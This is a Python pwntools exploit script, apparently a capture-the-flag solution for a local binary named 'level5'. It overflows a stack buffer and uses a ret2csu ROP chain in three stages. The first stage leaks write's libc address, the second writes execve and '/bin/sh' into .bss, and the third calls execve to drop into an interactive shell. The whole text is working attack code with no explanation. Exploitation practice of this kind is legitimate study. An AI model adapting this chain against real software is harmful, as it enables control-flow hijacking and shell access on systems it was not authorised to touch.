from pwn import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./level5"
libc_binary = "/lib/x86_64-linux-gnu/libc.so.6"
p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
libc = ELF(libc_binary)

main_plt = 0x400564
write_got = elf.got["write"]
read_got = elf.got["read"]
csu_pop = 0x400606
csu_call = 0x4005f0

context.arch = "amd64"
payload = flat([
    "a"*(0x80+8),csu_pop,
    0,0,1,write_got,1,write_got,8,
    csu_call,
    "p"*0x38,
    main_plt
]).ljust(0x200,"t")
p.sendafter("Hello, World\n",payload)
call_back = u64(p.recv(6).ljust(8,"\x00"))
log.success("write address is " + hex(call_back))

libc_base = call_back - libc.sym["write"]

bss_addr = elf.bss(0x100)
payload = flat([
    "a"*(0x80+8),csu_pop,
    # pop rbx,rbp,r12,r13,r14,r15
    # 0,1,func to call,argv[0],argv[1],argv[2]
    0,0,1,read_got,0,bss_addr,16,
    csu_call,
    "p"*0x38,
    main_plt
]).ljust(0x200,"t")

p.sendafter("Hello, World\n",payload)

execve_addr = libc_base + libc.sym["execve"]
p.send(p64(execve_addr) + "/bin/sh\x00")

log.success("execve addr is " + hex(execve_addr))
gdb.attach(p)
payload = flat([
    "a"*(0x88),csu_pop,
    # pop rbx,rbp,r12,r13,r14,r15
    # trash 0,rbx -> 0,rbp -> 1,r12 -> func to call ,r13 -> argv[2], r14 -> argv[1],r15 -> argv[0]
    0,0,1,bss_addr,bss_addr+8,0,0,
    csu_call,
    "p"*0x38,
    0xdeadbeef
]).ljust(0x200,"t")
p.sendafter("Hello, World\n",payload)

p.interactive()
